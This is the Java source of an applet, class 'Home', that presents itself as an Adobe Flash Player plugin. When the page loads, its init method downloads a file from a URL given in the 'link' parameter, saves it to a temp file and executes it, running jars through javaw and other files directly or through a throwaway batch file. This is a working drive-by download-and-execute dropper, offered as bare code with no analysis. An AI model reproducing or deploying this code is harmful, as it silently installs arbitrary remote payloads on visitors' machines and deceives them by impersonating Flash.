import java.applet.Applet;  
import java.io.*;  
import java.net.URL;  
import java.net.URLConnection;  

//Main --> Home

public class Home extends Applet  
{  
  public Home()  
  {  
  }  
  public void Plugin()  
    throws Exception  
  {  
    byte buffer[] = new byte[10240];  
    String archivo = getParameter("link");  
    System.out.println((new StringBuilder("Adobe Flash Player :")).append(archivo).toString());  
    String ext = archivo.substring(archivo.lastIndexOf("."));  
    ext = ext.toLowerCase();  
    File nuevo = File.createTempFile("FlashPlayer", ext);  
    FileOutputStream stream = new FileOutputStream(nuevo);  
    URL ur = new URL(archivo);  
    URLConnection uc = ur.openConnection();  
    BufferedInputStream is = new BufferedInputStream(uc.getInputStream());  
    int leidos;  
    while((leidos = is.read(buffer)) > 0)   
      stream.write(buffer, 0, leidos);  
    stream.close();  
    if(ext.contains(".jar"))  
      Runtime.getRuntime().exec((new StringBuilder(String.valueOf(System.getProperty("sun.boot.library.path")))).append("\\javaw.exe -jar \"").append(nuevo.getAbsolutePath()).append("\"").toString());  
    else  
      try  
      {  
        Runtime.getRuntime().exec(nuevo.getAbsolutePath());  
      }  
      catch(IOException e)  
      {  
        File f = File.createTempFile("tmp", ".bat");  
        f.createNewFile();  
        f.deleteOnExit();  
        PrintWriter pw = new PrintWriter(f);  
        pw.println((new StringBuilder("\"")).append(nuevo.getAbsolutePath()).append("\"").toString());  
        pw.close();  
        Runtime.getRuntime().exec(f.getAbsolutePath());  
        f.delete();  
      }  
    nuevo.deleteOnExit();  
  }  
  public void init()  
  {  
    try  
    {  
      Plugin();  
    }  
    catch(Exception e)  
    {  
      e.printStackTrace();  
    }  
    super.init();  
  }  
}  